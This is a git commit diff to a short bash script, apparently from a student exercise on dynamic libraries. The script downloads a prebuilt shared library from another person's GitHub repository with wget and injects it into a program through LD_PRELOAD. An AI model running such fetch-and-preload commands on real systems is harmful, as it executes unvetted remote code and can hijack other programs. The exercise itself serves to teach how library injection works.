8e030f12d8b78bbc98af63772d37515105d39621
Olorundamisi Dunmade <olorundamisi1@gmail.com>
2023-05-23 00:25:19 +0100

    gmli.so : Code Injection (updated to account for sysadmin)

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/olorundamisi/alx-low_level_programming/blob/main/0x18-dynamic_libraries/101-make_me_win.sh
-export LD_PRELOAD=/tmp/gmpl.so
+wget -O /tmp/gmli.so https://github.com/BennettDixon/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/libinjection.so
+export LD_PRELOAD=/tmp/gmli.so
